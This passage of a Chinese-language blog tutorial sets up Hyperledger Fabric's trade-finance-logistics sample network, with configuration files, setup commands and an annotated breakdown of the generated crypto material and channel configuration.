出口商准备一批货物并将其交给承运人</span><br><span class="line">9. 承运人在确认E / L后接受货物，然后向出口商提供提单</span><br><span class="line">10. 出口商的银行要求进口商银行支付一半的款项</span><br><span class="line">11. 进口商的银行将一半的金额转移到出口商的银行</span><br><span class="line">12. 承运人将货物运至目的地</span><br><span class="line">13. 进口商的银行向出口商的银行支付剩余金额</span><br></pre></td></tr></table></figure><p>这是一个解释交易工作流程的图表：</p><p><img src="/2019/03/28/trade-finance/1.png" alt=""></p><h4 id="2、构建fabric网络"><a href="#2、构建fabric网络" class="headerlink" title="2、构建fabric网络"></a>2、构建fabric网络</h4><p>样本贸易网络将由四个组织组成，分别代表出口商，进口商，承运商和监管机构。后两者分别代表运营商和监管机构实体。但是，出口组织既代表出口实体又代表其银行。同样，进口商组织代表进口实体及其银行。如下图所示：</p><p><img src="/2019/03/28/trade-finance/2.png" alt=""></p><h3 id="二、环境准备"><a href="#二、环境准备" class="headerlink" title="二、环境准备"></a>二、环境准备</h3><h4 id="1、hyperledger-fabric环境搭建"><a href="#1、hyperledger-fabric环境搭建" class="headerlink" title="1、hyperledger fabric环境搭建"></a>1、hyperledger fabric环境搭建</h4><p>具体过程见<a href="https://j-kangel.github.io/2019/03/24/hyperledger/">https://j-kangel.github.io/2019/03/24/hyperledger/</a></p><h4 id="2、trade-finance-logistics网络的下载"><a href="#2、trade-finance-logistics网络的下载" class="headerlink" title="2、trade-finance-logistics网络的下载"></a>2、trade-finance-logistics网络的下载</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> <span class="variable">$GOPATH</span>/src  </span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/HyperledgerHandsOn/trade-finance-logistics.git</span><br></pre></td></tr></table></figure><h4 id="3、设置cryptogen环境变量"><a href="#3、设置cryptogen环境变量" class="headerlink" title="3、设置cryptogen环境变量"></a>3、设置cryptogen环境变量</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:~/go/src/github.com/hyperledger/fabric/fabric-samples/bin</span><br><span class="line">$ cryptogen version   <span class="comment">#测试是否生效</span></span><br><span class="line">cryptogen:</span><br><span class="line"> Version: 1.4.0</span><br><span class="line"> Commit SHA: d700b43</span><br><span class="line"> Go version: go1.11.1</span><br><span class="line"> OS/Arch: linux/amd64</span><br></pre></td></tr></table></figure><h4 id="4、更改配置文件configtx-yaml"><a href="#4、更改配置文件configtx-yaml" class="headerlink" title="4、更改配置文件configtx.yaml"></a>4、更改配置文件configtx.yaml</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> go/src/trade-finance-logistics/network</span><br><span class="line">$ gedit configtx.yaml</span><br></pre></td></tr></table></figure><p>将以下内容移至文件末尾，这是因为hyperledger fabric1.4更新的语法规则</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Profiles:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">    FourOrgsTradeOrdererGenesis:</span></span><br><span class="line"><span class="attr">        Capabilities:</span></span><br><span class="line">            <span class="string">&lt;&lt;:</span> <span class="meta">*ChannelCapabilities</span></span><br><span class="line"><span class="attr">        Orderer:</span></span><br><span class="line">            <span class="string">&lt;&lt;:</span> <span class="meta">*OrdererDefaults</span></span><br><span class="line"><span class="attr">            Organizations:</span></span><br><span class="line"><span class="bullet">                -</span> <span class="meta">*TradeOrdererOrg</span></span><br><span class="line"><span class="attr">            Capabilities:</span></span><br><span class="line">                <span class="string">&lt;&lt;:</span> <span class="meta">*OrdererCapabilities</span></span><br><span class="line"><span class="attr">        Consortiums:</span></span><br><span class="line"><span class="attr">            TradeConsortium:</span></span><br><span class="line"><span class="attr">                Organizations:</span></span><br><span class="line"><span class="bullet">                    -</span> <span class="meta">*ExporterOrg</span></span><br><span class="line"><span class="bullet">                    -</span> <span class="meta">*ImporterOrg</span></span><br><span class="line"><span class="bullet">                    -</span> <span class="meta">*CarrierOrg</span></span><br><span class="line"><span class="bullet">                    -</span> <span class="meta">*RegulatorOrg</span></span><br><span class="line"><span class="attr">    FourOrgsTradeChannel:</span></span><br><span class="line"><span class="attr">        Consortium:</span> <span class="string">TradeConsortium</span></span><br><span class="line"><span class="attr">        Application:</span></span><br><span class="line">            <span class="string">&lt;&lt;:</span> <span class="meta">*ApplicationDefaults</span></span><br><span class="line"><span class="attr">            Organizations:</span></span><br><span class="line"><span class="bullet">                -</span> <span class="meta">*ExporterOrg</span></span><br><span class="line"><span class="bullet">                -</span> <span class="meta">*ImporterOrg</span></span><br><span class="line"><span class="bullet">                -</span> <span class="meta">*CarrierOrg</span></span><br><span class="line"><span class="bullet">                -</span> <span class="meta">*RegulatorOrg</span></span><br><span class="line"><span class="attr">            Capabilities:</span></span><br><span class="line">                <span class="string">&lt;&lt;:</span> <span class="meta">*ApplicationCapabilities</span></span><br></pre></td></tr></table></figure><h3 id="三、创建channel并运行网络"><a href="#三、创建channel并运行网络" class="headerlink" title="三、创建channel并运行网络"></a>三、创建channel并运行网络</h3><h4 id="1、创建通道channel"><a href="#1、创建通道channel" class="headerlink" title="1、创建通道channel"></a>1、创建通道channel</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> go/src/trade-finance-logistics/network</span><br><span class="line">$ ./trade.sh generate -c tradechannel</span><br></pre></td></tr></table></figure><p>此时会创建一个排序节点（orderer）和四个对等锚节点（ImporterOrg、ExporterOrg、RegulatorOrg、CarrierOrg），并生成相应的配置文件，稍后详细分析。</p><h4 id="2、启动网络"><a href="#2、启动网络" class="headerlink" title="2、启动网络"></a>2、启动网络</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./trade.sh up -c tradechannel</span><br></pre></td></tr></table></figure><p>启动成功后显示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Starting with channel <span class="string">'tradechannel'</span></span><br><span class="line">Continue? [Y/n] </span><br><span class="line">proceeding ...</span><br><span class="line">LOCAL_VERSION=1.4.0</span><br><span class="line">DOCKER_IMAGE_VERSION=1.4.0</span><br></pre></td></tr></table></figure><h4 id="3、关闭网络"><a href="#3、关闭网络" class="headerlink" title="3、关闭网络"></a>3、关闭网络</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./trade.sh down -c tradechannel</span><br></pre></td></tr></table></figure><p>关闭成功后显示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Stopping ca_peerImporterOrg           ... <span class="keyword">done</span>    <span class="comment">#停止进口商节点证书</span></span><br><span class="line">Stopping ca_peerRegulatorOrg          ... <span class="keyword">done</span></span><br><span class="line">Stopping ca_peerExporterOrg           ... <span class="keyword">done</span></span><br><span class="line">Stopping ca_peerCarrierOrg            ... <span class="keyword">done</span></span><br><span class="line">Stopping peer0.importerorg.trade.com  ... <span class="keyword">done</span>    <span class="comment">#停止进口商节点</span></span><br><span class="line">Stopping peer0.carrierorg.trade.com   ... <span class="keyword">done</span></span><br><span class="line">Stopping peer0.regulatororg.trade.com ... <span class="keyword">done</span></span><br><span class="line">Stopping orderer.trade.com            ... <span class="keyword">done</span></span><br><span class="line">Stopping peer0.exporterorg.trade.com  ... <span class="keyword">done</span></span><br><span class="line">Removing ca_peerImporterOrg           ... <span class="keyword">done</span>    <span class="comment">#移除进口商节点证书</span></span><br><span class="line">Removing ca_peerRegulatorOrg          ... <span class="keyword">done</span></span><br><span class="line">Removing ca_peerExporterOrg           ... <span class="keyword">done</span></span><br><span class="line">Removing ca_peerCarrierOrg            ... <span class="keyword">done</span></span><br><span class="line">Removing peer0.importerorg.trade.com  ... <span class="keyword">done</span>    <span class="comment">#移除进口商节点</span></span><br><span class="line">Removing peer0.carrierorg.trade.com   ... <span class="keyword">done</span></span><br><span class="line">Removing peer0.regulatororg.trade.com ... <span class="keyword">done</span></span><br><span class="line">Removing orderer.trade.com            ... <span class="keyword">done</span></span><br><span class="line">Removing peer0.exporterorg.trade.com  ... <span class="keyword">done</span></span><br><span class="line">Removing network net_trade</span><br><span class="line">Removing volume net_orderer.trade.com</span><br><span class="line">Removing volume net_peer0.exporterorg.trade.com</span><br><span class="line">Removing volume net_peer0.importerorg.trade.com</span><br><span class="line">Removing volume net_peer0.regulatororg.trade.com</span><br><span class="line">Removing volume net_peer0.carrierorg.trade.com</span><br></pre></td></tr></table></figure><h3 id="四、生成通道文件分析"><a href="#四、生成通道文件分析" class="headerlink" title="四、生成通道文件分析"></a>四、生成通道文件分析</h3><h4 id="1、网络加密材料配置文件crypto-config-yaml剖析"><a href="#1、网络加密材料配置文件crypto-config-yaml剖析" class="headerlink" title="1、网络加密材料配置文件crypto-config.yaml剖析"></a>1、网络加密材料配置文件crypto-config.yaml剖析</h4><p>该网络包含一个排序组织和四个对等节点组织，具体关系如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># "OrdererOrgs" - Definition of organizations managing orderer nodes</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="attr">OrdererOrgs:</span>  <span class="comment">##管理orderer节点的组织的定义</span></span><br><span class="line"><span class="bullet">  -</span> <span class="string">TradeOrderer</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># "PeerOrgs" - Definition of organizations managing peer nodes</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="attr">PeerOrgs:</span>    <span class="comment">##管理Peer节点的组织的定义</span></span><br><span class="line"><span class="bullet">  -</span> <span class="string">ExporterOrg</span></span><br><span class="line"><span class="bullet">  -</span> <span class="string">ImporterOrg</span></span><br><span class="line"><span class="bullet">  -</span> <span class="string">CarrierOrg</span></span><br><span class="line"><span class="bullet">  -</span> <span class="string">RegulatorOrg</span></span><br></pre></td></tr></table></figure><p>每个组织都有各自的属性，下面以ImporterOrg为例</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ImporterOrg</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="attr">- Name:</span> <span class="string">ImporterOrg</span>     <span class="comment">##组织名称</span></span><br><span class="line"><span class="attr">  Domain:</span> <span class="string">importerorg.trade.com</span>   <span class="comment">##组织域名</span></span><br><span class="line"><span class="attr">  EnableNodeOUs:</span> <span class="literal">true</span>             <span class="comment">##如果设置了EnableNodeOUs，就在msp下生成config.yaml文件</span></span><br><span class="line"><span class="attr">  Template:</span></span><br><span class="line"><span class="attr">    Count:</span> <span class="number">1</span>            <span class="comment">##表示生成一个peer</span></span><br><span class="line"><span class="attr">  Users:</span></span><br><span class="line"><span class="attr">    Count:</span> <span class="number">2</span>            <span class="comment">##表示生成两个普通用户</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------------</span></span><br></pre></td></tr></table></figure><h4 id="2、生成所有组织加密材料"><a href="#2、生成所有组织加密材料" class="headerlink" title="2、生成所有组织加密材料"></a>2、生成所有组织加密材料</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cryptogen generate --config=./crypto-config.yaml  <span class="comment">##./trade.sh generate第一部分</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ tree -L 2 crypto-config   <span class="comment">##查看crypto-config的二级目录</span></span><br><span class="line">crypto-config</span><br><span class="line">├── ordererOrganizations    <span class="comment">##order组织只有一个</span></span><br><span class="line">│   └── trade.com</span><br><span class="line">└── peerOrganizations       <span class="comment">##peer组织有四个</span></span><br><span class="line">    ├── carrierorg.trade.com</span><br><span class="line">    ├── exporterorg.trade.com</span><br><span class="line">    ├── importerorg.trade.com</span><br><span class="line">    └── regulatororg.trade.com</span><br></pre></td></tr></table></figure><p>现在以trade.com为例进行展开分析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">$ tree  crypto-config/ordererOrganizations/trade.com/</span><br><span class="line">crypto-config/ordererOrganizations/trade.com/</span><br><span class="line">├── ca   <span class="comment">## 存放组织根证书及私钥(采用EC算法)证书为【自签名】，组织内的实体将给予该根证书作为证书根</span></span><br><span class="line">│   ├── ca.trade.com-cert.pem  <span class="comment">## 证书CA</span></span><br><span class="line">│   └── d046c897334d539608c5fa578e7686441ec41115702ff8105e22998785839612_sk  <span class="comment">## 私钥</span></span><br><span class="line">├── msp  <span class="comment">## 存放该组织身份信息</span></span><br><span class="line">│   ├── admincerts  <span class="comment">## 组织管理员身份验证证书，【被根证书签名】</span></span><br><span class="line">│   │   └── Admin@trade.com-cert.pem  </span><br><span class="line">│   ├── cacerts     <span class="comment">## 组织的根证书 【和CA目录里面一致】</span></span><br><span class="line">│   │   └── ca.trade.com-cert.pem  </span><br><span class="line">│   └── tlscacerts  <span class="comment">## 用于TLS的CA证书，【自签名】</span></span><br><span class="line">│       └── tlsca.trade.com-cert.pem</span><br><span class="line">├── orderers  <span class="comment">## 存放所有 Orderer 的身份信息</span></span><br><span class="line">│   └── orderer.trade.com   <span class="comment">## 第一个Orderer的信息msp及tls</span></span><br><span class="line">│       ├── msp</span><br><span class="line">│       │   ├── admincerts  <span class="comment">## 组织管理员身份验证证书 </span></span><br><span class="line">│       │   │   └── Admin@trade.com-cert.pem</span><br><span class="line">│       │   ├── cacerts</span><br><span class="line">│       │   │   └── ca.trade.com-cert.pem</span><br><span class="line">│       │   ├── keystore  <span class="comment">## 本节点的身份私钥，用来签名</span></span><br><span class="line">│       │   │   └── 38195f71e2b520910f2a2e405764975e235c7d97ff6a7fde41127e1575888375_sk</span><br><span class="line">│       │   ├── signcerts  <span class="comment">## 验证本节点签名的证书，【被根证书签名】</span></span><br><span class="line">│       │   │   └── orderer.trade.com-cert.pem</span><br><span class="line">│       │   └── tlscacerts  <span class="comment">## TLS连接用的身份证书，【和msp.tlscacerts一致】</span></span><br><span class="line">│       │       └── tlsca.trade.com-cert.pem</span><br><span class="line">│       └── tls  <span class="comment">## tls 的相关信息</span></span><br><span class="line">│           ├── ca.crt   <span class="comment">##【组织的根证书】</span></span><br><span class="line">│           ├── server.crt  <span class="comment">## 验证本节点签名的证书，【被根证书签名】</span></span><br><span class="line">│           └── server.key  <span class="comment">## 本节点的身份私钥，用来签名</span></span><br><span class="line">├── tlsca  <span class="comment">## 存放tls相关的证书和私钥</span></span><br><span class="line">│   ├── acbada48c339b2b60cb9bac3914f359722f37de001628f110792153d8614c443_sk</span><br><span class="line">│   └── tlsca.trade.com-cert.pem</span><br><span class="line">└── users  <span class="comment">##  存放属于该组织的用户的实体</span></span><br><span class="line">    └── Admin@trade.com</span><br><span class="line">        ├── msp</span><br><span class="line">        │   ├── admincerts</span><br><span class="line">        │   │   └── Admin@trade.com-cert.pem</span><br><span class="line">        │   ├── cacerts</span><br><span class="line">        │   │   └── ca.trade.com-cert.pem</span><br><span class="line">        │   ├── keystore</span><br><span class="line">        │   │   └── 2187f9edda98eae3b2169a476e30aff6fb2781c19e6cb400671b723d7b74abde_sk</span><br><span class="line">        │   ├── signcerts</span><br><span class="line">        │   │   └── Admin@trade.com-cert.pem</span><br><span class="line">        │   └── tlscacerts</span><br><span class="line">        │       └── tlsca.trade.com-cert.pem</span><br><span class="line">        └── tls</span><br><span class="line">            ├── ca.crt</span><br><span class="line">            ├── client.crt</span><br><span class="line">            └── client.key</span><br></pre></td></tr></table></figure><p>我们可以知道cryptogen工具无非就是在各个资源下生成组织和私钥、证书等等，其中最关键的就是各个资源下的MSP目录内容：</p><pre><code>admincerts：    管理员的身份证书文件cacerts：       信任的根证书文件keystore：      节点的签名私钥文件signcerts：     节点的签名身份证书文件tlscacerts：    TLS连接用的证书</code></pre><h4 id="3、通道及锚节点的配置-configtx-yaml-配置剖析"><a href="#3、通道及锚节点的配置-configtx-yaml-配置剖析" class="headerlink" title="3、通道及锚节点的配置  configtx.yaml 配置剖析"></a>3、通道及锚节点的配置  configtx.yaml 配置剖析</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Organizations:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="meta">&amp;TradeOrdererOrg</span></span><br><span class="line"><span class="attr">        Name:</span> <span class="string">TradeOrdererOrg</span> <span class="comment">#Orderer的组织的名称</span></span><br><span class="line"><span class="attr">        ID:</span> <span class="string">TradeOrdererMSP</span>   <span class="comment">#Orderer的组织的ID</span></span><br><span class="line">        <span class="comment"># MSPDir是包含Orderer的MSP证书目录路径</span></span><br><span class="line"><span class="attr">        MSPDir:</span> <span class="string">crypto-config/ordererOrganizations/trade.com/msp</span>  </span><br><span class="line">        </span><br><span class="line"><span class="bullet">    -</span> <span class="meta">&amp;ExporterOrg</span></span><br><span class="line"><span class="attr">        Name:</span> <span class="string">ExporterOrgMSP</span> </span><br><span class="line"><span class="attr">        ID:</span> <span class="string">ExporterOrgMSP</span></span><br><span class="line"><span class="attr">        MSPDir:</span> <span class="string">crypto-config/peerOrganizations/exporterorg.trade.com/msp</span></span><br><span class="line"><span class="attr">        AnchorPeers:</span></span><br><span class="line">            <span class="comment">#锚点定义可以使用的对等节点的位置</span></span><br><span class="line">            <span class="comment">#这些节点用于跨组织的信息交流。注意，这个值只是</span></span><br><span class="line">            <span class="comment">#用来加密应用程序部分上下文的创世区块</span></span><br><span class="line"><span class="attr">            - Host:</span> <span class="string">peer0.exporterorg.trade.com</span>  <span class="comment">##  锚节点的主机名</span></span><br><span class="line"><span class="attr">              Port:</span> <span class="number">7051</span>  <span class="comment">##  锚节点的端口号</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">    -</span> <span class="meta">&amp;ImporterOrg</span></span><br><span class="line"><span class="attr">        Name:</span> <span class="string">ImporterOrgMSP</span></span><br><span class="line"><span class="attr">        ID:</span> <span class="string">ImporterOrgMSP</span></span><br><span class="line"><span class="attr">        MSPDir:</span> <span class="string">crypto-config/peerOrganizations/importerorg.trade.com/msp</span></span><br><span class="line"><span class="attr">        AnchorPeers:</span></span><br><span class="line"><span class="attr">            - Host:</span> <span class="string">peer0.importerorg.trade.com</span></span><br><span class="line"><span class="attr">              Port:</span> <span class="number">7051</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">    -</span> <span class="meta">&amp;CarrierOrg</span></span><br><span class="line"><span class="attr">        Name:</span> <span class="string">CarrierOrgMSP</span></span><br><span class="line"><span class="attr">        ID:</span> <span class="string">CarrierOrgMSP</span></span><br><span class="line"><span class="attr">        MSPDir:</span> <span class="string">crypto-config/peerOrganizations/carrierorg.trade.com/msp</span></span><br><span class="line"><span class="attr">        AnchorPeers:</span></span><br><span class="line"><span class="attr">            - Host:</span> <span class="string">peer0.carrierorg.trade.com</span></span><br><span class="line"><span class="attr">              Port:</span> <span class="number">7051</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">    -</span> <span class="meta">&amp;RegulatorOrg</span></span><br><span class="line"><span class="attr">        Name:</span> <span class="string">RegulatorOrgMSP</span></span><br><span class="line"><span class="attr">        ID:</span> <span class="string">RegulatorOrgMSP</span></span><br><span class="line"><span class="attr">        MSPDir:</span> <span class="string">crypto-config/peerOrganizations/regulatororg.trade.com/msp</span></span><br><span class="line"><span class="attr">        AnchorPeers:</span></span><br><span class="line"><span class="attr">            - Host:</span> <span class="string">peer0.regulatororg.trade.com</span></span><br><span class="line"><span class="attr">              Port:</span> <span class="number">7051</span></span><br><span class="line"></span><br><span class="line"><span class="comment">################################################################################</span></span><br><span class="line"><span class="comment">#   SECTION: Orderer</span></span><br><span class="line"><span class="comment">################################################################################</span></span><br><span class="line"><span class="attr">Orderer:</span> <span class="meta">&amp;OrdererDefaults</span></span><br><span class="line"><span class="attr">    OrdererType:</span> <span class="string">solo</span>   <span class="comment">## Orderer类型，包含solo和kafka集群</span></span><br><span class="line"><span class="attr">    Addresses:</span>   <span class="comment">## 服务地址</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">orderer.trade.com:7050</span></span><br><span class="line"><span class="attr">    BatchTimeout:</span> <span class="number">2</span><span class="string">s</span> <span class="comment">##  区块打包的最大超时时间 (到了该时间就打包区块)</span></span><br><span class="line"><span class="attr">    BatchSize:</span></span><br><span class="line">        <span class="comment">#一个区块里最大的交易数</span></span><br><span class="line"><span class="attr">        MaxMessageCount:</span> <span class="number">10</span></span><br><span class="line">        <span class="comment"># 一个区块的最大字节数， 任何时候都不能超过</span></span><br><span class="line"><span class="attr">        AbsoluteMaxBytes:</span> <span class="number">99</span> <span class="string">MB</span></span><br><span class="line">        <span class="comment">#一个区块的建议字节数，如果一个交易消息的大小超过了这个值, 就会被放入另外一个更大的区块中</span></span><br><span class="line"><span class="attr">        PreferredMaxBytes:</span> <span class="number">512</span> <span class="string">KB</span></span><br><span class="line"><span class="attr">    Kafka:</span></span><br><span class="line"><span class="attr">        Brokers:</span>  <span class="comment">## kafka的 brokens 服务地址 允许有多个</span></span><br><span class="line"><span class="bullet">            -</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:9092</span></span><br><span class="line"><span class="attr">    Organizations:</span> <span class="comment">##  参与维护 Orderer 的组织，默认为空</span></span><br><span class="line"></span><br><span class="line"><span class="comment">################################################################################</span></span><br><span class="line"><span class="comment">#   SECTION: Application</span></span><br><span class="line"><span class="comment">################################################################################</span></span><br><span class="line"><span class="attr">Application:</span> <span class="meta">&amp;ApplicationDefaults</span> <span class="comment">## 自定义被引用的地址</span></span><br><span class="line"><span class="attr">    Organizations:</span></span><br><span class="line"><span class="comment">################################################################################</span></span><br><span class="line"><span class="comment">#   SECTION: Capabilities</span></span><br><span class="line"><span class="comment">################################################################################</span></span><br><span class="line"><span class="attr">Capabilities:</span></span><br><span class="line"><span class="attr">    Global:</span> <span class="meta">&amp;ChannelCapabilities</span></span><br><span class="line"><span class="attr">        V1_1:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">    Orderer:</span> <span class="meta">&amp;OrdererCapabilities</span></span><br><span class="line"><span class="attr">        V1_1:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">    Application:</span> <span class="meta">&amp;ApplicationCapabilities</span></span><br><span class="line"><span class="attr">        V1_1:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Profiles:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">    FourOrgsTradeOrdererGenesis:</span></span><br><span class="line"><span class="attr">        Capabilities:</span></span><br><span class="line">            <span class="string">&lt;&lt;:</span> <span class="meta">*ChannelCapabilities</span></span><br><span class="line"><span class="attr">        Orderer:</span></span><br><span class="line">            <span class="string">&lt;&lt;:</span> <span class="meta">*OrdererDefaults</span></span><br><span class="line"><span class="attr">            Organizations:</span></span><br><span class="line"><span class="bullet">                -</span> <span class="meta">*TradeOrdererOrg</span></span><br><span class="line"><span class="attr">            Capabilities:</span></span><br><span class="line">                <span class="string">&lt;&lt;:</span> <span class="meta">*OrdererCapabilities</span></span><br><span class="line"><span class="attr">        Consortiums:</span></span><br><span class="line"><span class="attr">            TradeConsortium:</span></span><br><span class="line"><span class="attr">                Organizations:</span></span><br><span class="line"><span class="bullet">                    -</span> <span class="meta">*ExporterOrg</span></span><br><span class="line"><span class="bullet">                    -</span> <span class="meta">*ImporterOrg</span></span><br><span class="line"><span class="bullet">                    -</span> <span class="meta">*CarrierOrg</span></span><br><span class="line"><span class="bullet">                    -</span> <span class="meta">*RegulatorOrg</span></span><br><span class="line"><span class="attr">    